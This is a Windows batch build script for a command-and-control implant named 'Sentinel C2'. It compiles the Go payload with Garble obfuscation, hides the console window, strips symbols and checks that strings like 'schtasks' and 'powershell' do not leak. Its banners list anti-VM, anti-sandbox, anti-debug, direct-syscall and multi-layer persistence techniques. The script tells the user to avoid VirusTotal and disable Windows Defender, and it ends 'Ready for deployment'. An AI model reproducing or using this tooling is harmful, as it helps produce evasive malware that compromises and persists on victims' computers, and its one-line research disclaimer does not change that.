@echo off
REM ═══════════════════════════════════════════════════════════════════════════
REM SENTINEL C2 - ADVANCED STEALTH BUILD
REM ═══════════════════════════════════════════════════════════════════════════
REM Técnicas implementadas:
REM   - Garble Obfuscation (strings, funções, imports)
REM   - Dynamic API Resolution
REM   - Sleep Obfuscation com Memory Encryption
REM   - Syscalls Diretas (Hell's Gate)
REM   - Environmental Keying
REM   - VM/Sandbox Detection (18 checks)
REM ═══════════════════════════════════════════════════════════════════════════

echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║         SENTINEL C2 - ADVANCED STEALTH BUILD                   ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM 1. Verificar se Garble está instalado
REM ─────────────────────────────────────────────────────────────────────────
echo [*] Checking for Garble...
where garble >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [-] Garble not found! Installing...
    go install mvdan.cc/garble@latest
    if %ERRORLEVEL% NEQ 0 (
        echo [!] Failed to install Garble. Using standard build...
        set USE_GARBLE=0
    ) else (
        echo [+] Garble installed successfully!
        set USE_GARBLE=1
    )
) else (
    echo [+] Garble found!
    set USE_GARBLE=1
)

REM ─────────────────────────────────────────────────────────────────────────
REM 2. Limpar builds anteriores
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo [*] Cleaning previous builds...
if exist sentinel.exe del /Q sentinel.exe
if exist test_*.exe del /Q test_*.exe

REM ─────────────────────────────────────────────────────────────────────────
REM 3. Configurar variáveis de build
REM ─────────────────────────────────────────────────────────────────────────
set GOOS=windows
set GOARCH=amd64
set OUTPUT=sentinel.exe

REM Gerar timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /format:list') do set datetime=%%I
set BUILD_TIME=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2% %datetime:~8,2%:%datetime:~10,2%

REM Flags de compilação
set LDFLAGS=-s -w -H=windowsgui
set LDFLAGS=%LDFLAGS% -X 'main.buildTime=%BUILD_TIME%'

REM ─────────────────────────────────────────────────────────────────────────
REM 4. Build com Garble (Ofuscação Máxima)
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo [*] Building with maximum obfuscation...
echo.

if %USE_GARBLE%==1 (
    echo [+] Using GARBLE build (maximum evasion)
    echo.

    REM Garble Flags:
    REM   -tiny       : Reduz tamanho do binário
    REM   -literals   : Ofusca strings literais
    REM   -seed=random: Seed aleatório (cada build diferente)

    garble -tiny -literals -seed=random build -trimpath -ldflags="%LDFLAGS%" -o %OUTPUT% .

    if %ERRORLEVEL% NEQ 0 (
        echo [-] Garble build failed! Falling back to standard build...
        goto STANDARD_BUILD
    )

    echo [+] Garble build completed!
) else (
    :STANDARD_BUILD
    echo [+] Using STANDARD build (basic evasion)
    echo.

    go build -trimpath -ldflags="%LDFLAGS%" -o %OUTPUT% .

    if %ERRORLEVEL% NEQ 0 (
        echo [-] Build failed!
        exit /b 1
    )
)

REM ─────────────────────────────────────────────────────────────────────────
REM 5. Informações do binário
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                     BUILD SUCCESSFUL                           ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.

for %%A in (%OUTPUT%) do (
    set SIZE=%%~zA
)

REM Converter bytes para MB
set /A SIZE_MB=%SIZE% / 1048576
set /A SIZE_KB=%SIZE% / 1024

echo [+] Binary: %OUTPUT%
echo [+] Size: %SIZE_KB% KB (%SIZE_MB% MB)
echo [+] Build Time: %BUILD_TIME%
echo [+] Architecture: %GOARCH%
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM 6. Verificar strings (opcional)
REM ─────────────────────────────────────────────────────────────────────────
echo [*] Checking for leaked strings...
strings %OUTPUT% | findstr /I "schtasks powershell sentinel" >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [!] WARNING: Sensitive strings detected! Obfuscation may have failed.
) else (
    echo [+] No sensitive strings detected!
)

REM ─────────────────────────────────────────────────────────────────────────
REM 7. Técnicas implementadas
REM ─────────────────────────────────────────────────────────────────────────
echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║              EVASION TECHNIQUES IMPLEMENTED                    ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo  [✓] Garble Obfuscation (strings, symbols, control flow)
echo  [✓] String Encryption (XOR + Base64)
echo  [✓] Sleep Obfuscation with Memory Encryption (AES-256-GCM)
echo  [✓] Random Delays (100-3000ms with jitter)
echo  [✓] Dynamic API Resolution (IAT clean)
echo  [✓] API Hashing (DJB2)
echo  [✓] Syscalls Diretas (Hell's Gate / Halo's Gate)
echo  [✓] VM Detection (18 heuristics)
echo  [✓] Sandbox Detection (timing, processes, files)
echo  [✓] Anti-Debugger (timing-based)
echo  [✓] Anti-Emulation (execution speed check)
echo  [✓] Environmental Keying (targeted payload)
echo  [✓] Multi-Layer Persistence (Registry + Tasks + WMI)
echo  [✓] Polymorphic Migration (Melt && Move)
echo  [✓] Process Mutex (single instance)
echo  [✓] Hidden Windows (no console flash)
echo  [✓] Symbol Stripping (-s -w)
echo  [✓] Path Trimming (no source paths)
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM 8. Avisos de segurança
REM ─────────────────────────────────────────────────────────────────────────
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                    SECURITY WARNINGS                           ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo  [!] DO NOT UPLOAD TO VIRUSTOTAL
echo  [!] Disable Windows Defender before testing
echo  [!] Use in isolated lab environment only
echo  [!] For authorized research/pentesting only
echo.

REM ─────────────────────────────────────────────────────────────────────────
REM 9. Próximos passos
REM ─────────────────────────────────────────────────────────────────────────
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                     NEXT STEPS                                 ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo  1. Disable Windows Defender Real-Time Protection
echo  2. Add exclusion for this folder
echo  3. Test in VM with snapshots
echo  4. Monitor with Process Monitor (optional)
echo  5. Check persistence: regedit / Task Scheduler
echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                    BUILD COMPLETE                              ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.
echo [+] Binary: %OUTPUT%
echo [+] Ready for deployment
echo.
echo [*] Press any key to exit...
pause >nul
